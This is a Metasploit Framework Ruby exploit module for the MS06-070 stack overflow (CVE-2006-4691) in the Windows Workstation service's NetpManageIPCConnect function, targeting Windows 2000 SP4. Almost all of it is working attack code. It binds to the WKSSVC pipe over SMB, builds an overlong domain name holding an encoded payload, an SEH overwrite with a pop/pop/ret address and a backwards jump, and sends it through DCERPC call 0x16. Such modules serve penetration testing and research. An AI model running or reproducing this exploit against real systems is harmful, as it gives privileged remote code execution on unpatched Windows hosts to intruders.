##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking
	# for now, you need to specify a domain name manually...

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Seh
	

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft Workstation Service NetpManageIPCConnect Overflow',
			'Description'    => %q{
        		This module exploits a stack overflow in the NetApi32 NetpManageIPCConnect 
				function using the Workstation service in Windows 2000 SP4 and Windows XP SP2.
			},
			'Author'         =>
				[
					'jduck'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2006-4691' ],
					[ 'OSVDB', '30263' ],
					[ 'BID', '20985' ],
					[ 'MSB', 'MS06-070' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					# TODO: adjust
					'Space'    => (1058*2),
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'DefaultTarget'  => 0,
			'Targets'        => 
				[
					[ 'Windows 2000 SP4',
						{
							# 'Ret' => 0x77e11636  # pop/pop/ret in user32.dll
							'Ret' => 0x7801e85c  # pop/pop/ret in msvcrt.dll
						} 
					],
				],

			'DisclosureDate' => 'Nov 14 2006'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use.", 'WKSSVC']),
				# Can this be discovered / faked?
				OptString.new('DOMAIN', [ true,  "The live domain name to use."]),
			], self.class)
						
	end

	def exploit	

		connect()
		smb_login()

		handle = dcerpc_handle(
			'6bffd098-a112-3610-9833-46c3f87e345a', '1.0',
			'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
		)

		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		print_status("Building the stub data...")	

		hostname = payload.encoded
		hostname << generate_seh_record(target.ret)
		hostname << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + payload_space.to_s).encode_string
		
		name = datastore['DOMAIN'] + "\\\\L"
		name = Rex::Text.to_unicode(name)
		name << hostname
		name << Rex::Text.to_unicode(rand_text_alphanumeric(1000) * 3)
		name << "\x00\x00"
		
		stub =
			NDR.uwstring("\\\\#{datastore['RHOST']}") +
			NDR.UnicodeConformantVaryingStringPreBuilt(name) +
			NDR.uwstring("") +
			NDR.uwstring("") +
			NDR.long(0) +
			NDR.long(1) 

		print_status("Calling the vulnerable function...")

		begin
			dcerpc.call(0x16, stub)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
		rescue => e
			if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
				raise e
			end
		end

		# Cleanup
		handler
		disconnect
	end

end



=begin

The IDL for NetrJoinDomain2 looks like this:
long _NetrJoinDomain2@28 (
 [in][unique][string] wchar_t * arg_1,
 [in][string] wchar_t * arg_2,
 [in][unique][string] wchar_t * arg_3,
 [in][unique][string] wchar_t * arg_4,
 [in][unique] struct_C * arg_5,
 [in] long arg_6
 );

=end
